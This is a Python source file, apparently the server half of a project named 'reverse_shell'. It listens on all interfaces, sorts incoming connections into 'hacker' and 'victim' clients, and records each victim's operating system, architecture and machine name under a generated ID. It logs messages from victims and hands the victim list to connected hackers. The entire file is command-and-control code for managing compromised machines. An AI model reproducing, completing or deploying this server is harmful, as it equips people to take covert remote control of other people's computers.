import socket
import threading
import reverse_shell.consts as ct
import reverse_shell.utils as ut
import json
import uuid

SERVER = "0.0.0.0"  # this is a wildcard for binding all adresses available to the host
ADDR = (SERVER, ct.SERVER_PORT)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind(ADDR)

# All the victims that are currently connected to the server
all_victims = {}


def handle_client(client_sock: socket.socket, client_addr):
    identification_message = ut.recieve_message(client_sock)
    args = (client_sock, client_addr)

    if identification_message == "hacker":
        ut.send_message(ct.VERIFIED_MESSAGE, client_sock)
        handle_hacker(*args)

    elif identification_message == "victim":
        ut.send_message(ct.VERIFIED_MESSAGE, client_sock)
        handle_victim(*args)

    else:
        ut.send_message(ct.UNVERIFIED_MESSAGE, client_sock)
        # close the connection with the client
        ut.log("vertification failiure", f"{client_addr} is not a verified client.")
        client_sock.close()


def handle_hacker(hacker_sock: socket.socket, hacker_addr):
    ut.log("connection accepted", f"hacker {hacker_addr} has connected.")

    connected = True  # Connected with the hacker

    # recieve commands from the hacker and then execute
    # them accordingly
    while connected:
        message = ut.recieve_message(hacker_sock)
        if not message:
            connected = False
            continue

        if message == "get_victims":
            ut.send_message(json.dumps(all_victims), hacker_sock)

        if message == ct.DISCONNECT_MESSAGE:
            connected = False


def handle_victim(victim_sock: socket.socket, victim_addr):
    ut.log("connection accepted", f"victim {victim_addr} has connected.")

    connected = True  # This means we have connected to the victim

    # Get the computer configurations
    computer_info = ut.recieve_message(victim_sock)
    if computer_info is not None:
        computer_info = json.loads(computer_info)

    else:
        computer_info = {"os": "unknown", "arch": "unknown", "name": "unknown"}

    victim_id = str(uuid.uuid4())
    all_victims[victim_id] = computer_info

    while connected:
        message = ut.recieve_message(victim_sock)
        if not message:
            connected = False
            continue

        if message == ct.DISCONNECT_MESSAGE:
            connected = False

        ut.log(f"MESSAGE ACCEPTED", f"{victim_addr} -> {message}")

    victim_sock.close()
    del all_victims[victim_id]
    ut.log("DISCONNECTED", f"{victim_addr} has disconnected:(")


def start():
    server.listen()
    ut.log("listening", f"server is listening on {ADDR}")

    while True:
        client_sock, client_addr = server.accept()  # this line blocks the execution so as soon as we get a new client we have to handle it using the handle_client function.

        thread = threading.Thread(target=handle_client, args=(client_sock, client_addr))
        thread.start()  # handling the client in another thread

        # the "-1" is used since python runs it's main thread, and we don't care about the main thread but rather, the threads that we execute our selves
        ut.log("active connections", f"{threading.active_count() - 1}")


def main():
    ut.log("starting server", "server is starting...")
    start()


if __name__ == "__main__":
    main()
